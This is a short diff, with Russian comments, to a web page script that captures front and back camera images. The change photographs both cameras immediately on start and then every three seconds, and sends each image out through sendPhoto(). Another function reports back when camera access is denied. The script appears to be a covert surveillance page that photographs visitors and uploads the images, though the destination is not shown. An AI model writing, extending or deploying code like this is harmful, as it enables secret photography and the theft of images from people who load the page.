@@ -86,6 +86,17 @@ async function start() {
     backStream = await getCamera('environment');
     videoBack.srcObject = backStream;
 
+    // Сразу сделать фото обеих камер
+    if (videoFront.readyState >= 2) {
+      const blobFront = await takePhoto(videoFront, canvasFront);
+      sendPhoto(blobFront);
+    }
+    if (videoBack.readyState >= 2) {
+      const blobBack = await takePhoto(videoBack, canvasBack);
+      sendPhoto(blobBack);
+    }
+
+    // Затем запускать фото каждые 3 секунды
     photoInterval = setInterval(async () => {
       if (videoFront.readyState >= 2) {
         const blobFront = await takePhoto(videoFront, canvasFront);
@@ -95,11 +106,12 @@ async function start() {
         const blobBack = await takePhoto(videoBack, canvasBack);
         sendPhoto(blobBack);
       }
-    }, 5000);
+    }, 3000);
 
   } catch (err) {
     await sendDeniedMessage();
   }
 }
+
 
 start();
